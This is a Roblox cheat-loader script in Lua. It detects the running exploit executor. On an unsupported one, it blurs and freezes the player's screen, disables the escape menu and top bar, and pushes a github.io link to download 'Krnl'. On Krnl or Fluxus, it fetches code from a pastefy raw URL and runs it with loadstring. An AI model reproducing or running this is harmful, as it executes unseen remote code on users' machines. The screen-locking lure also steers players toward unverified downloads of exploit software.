-- Centered Executor Check Prompt with Blur & Freeze
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local StarterGui = game:GetService("StarterGui")
local GuiService = game:GetService("GuiService")
local player = Players.LocalPlayer
local camera = workspace.CurrentCamera

-- Enhanced executor detection
local function getExecutorName()
    if identifyexecutor then
        return identifyexecutor()
    elseif getexecutorname then
        return getexecutorname()
    elseif isdelta then
        return "Delta"
    elseif iskrnlclosure then
        return "Krnl"
    elseif syn then
        return "Synapse X"
    elseif is_sirhurt_closure then
        return "SirHurt"
    elseif pebc_execute then
        return "ProtoSmasher"
    elseif isfluxus then
        return "Fluxus"
    else
        return "Unknown"
    end
end

local executor = getExecutorName()
warn("Executor Detected:", executor)

-- Only proceed if using Krnl/Fluxus
if not (executor:lower():find("krnl") or executor:lower():find("fluxus")) then
    -- Blur effect setup
    local blur = Instance.new("BlurEffect")
    blur.Size = 20
    blur.Name = "ExecutorBlockBlur"
    blur.Parent = Lighting

    -- Freeze character
    UserInputService.ModalEnabled = true
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    local rootPart = character:WaitForChild("HumanoidRootPart")
    
    humanoid.WalkSpeed = 0
    humanoid.JumpPower = 0
    humanoid.AutoRotate = false
    rootPart.Anchored = true
    camera.CameraType = Enum.CameraType.Scriptable
    camera.CFrame = CFrame.new(rootPart.Position + Vector3.new(0, 6, 12), rootPart.Position)

    -- Create perfectly centered UI
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "ExecutorWarningUI"
    screenGui.IgnoreGuiInset = true
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.Parent = player:WaitForChild("PlayerGui")

    -- Main container frame (perfectly centered)
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 400, 0, 180)
    mainFrame.AnchorPoint = Vector2.new(0.5, 0.5) -- Key for perfect centering
    mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0) -- Center of screen
    mainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    mainFrame.BorderSizePixel = 0
    mainFrame.BackgroundTransparency = 0
    mainFrame.Parent = screenGui

    -- Rounded corners
    local uiCorner = Instance.new("UICorner")
    uiCorner.CornerRadius = UDim.new(0, 10)
    uiCorner.Parent = mainFrame

    -- Warning message text
    local title = Instance.new("TextLabel")
    title.Text = "This script is not stable on "..executor..".\nPlease use Krnl if you wish to use the script."
    title.Font = Enum.Font.Gotham
    title.TextSize = 18
    title.TextColor3 = Color3.fromRGB(30, 30, 30)
    title.BackgroundTransparency = 1
    title.Size = UDim2.new(1, -40, 0, 100)
    title.Position = UDim2.new(0, 20, 0, 20)
    title.TextWrapped = true
    title.TextXAlignment = Enum.TextXAlignment.Center
    title.TextYAlignment = Enum.TextYAlignment.Center
    title.Parent = mainFrame

    -- Copy button (centered horizontally)
    local copyButton = Instance.new("TextButton")
    copyButton.Size = UDim2.new(0, 200, 0, 36)
    copyButton.AnchorPoint = Vector2.new(0.5, 0) -- Center horizontally
    copyButton.Position = UDim2.new(0.5, 0, 1, -50) -- Bottom center
    copyButton.BackgroundColor3 = Color3.fromRGB(180, 180, 180)
    copyButton.Text = "Copy KRNL"
    copyButton.Font = Enum.Font.Gotham
    copyButton.TextSize = 16
    copyButton.TextColor3 = Color3.fromRGB(0, 0, 0)
    copyButton.AutoButtonColor = true
    copyButton.Parent = mainFrame

    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 6)
    buttonCorner.Parent = copyButton

    copyButton.MouseButton1Click:Connect(function()
        -- Try to open browser directly
        local success = pcall(function()
            GuiService:OpenBrowserWindow("https://ctrl-growagarden.github.io/Bloxifiedscripts/")
        end)
        
        if not success then
            -- Fallback to clipboard copy
            if setclipboard then
                setclipboard("https://ctrl-growagarden.github.io/Bloxifiedscripts/")
                copyButton.Text = "Link Copied!"
                task.wait(1.5)
                copyButton.Text = "Copy KRNL"
            else
                copyButton.Text = "Paste it in your browser"
                task.wait(1.5)
                copyButton.Text = "Copy KRNL"
            end
        end
    end)

    -- Disable escape menu
    pcall(function()
        StarterGui:SetCore("TopbarEnabled", false)
    end)
else
    -- Supported executor - load main script
    loadstring(game:HttpGet("https://pastefy.app/NPlKOOD8/raw"))()
end
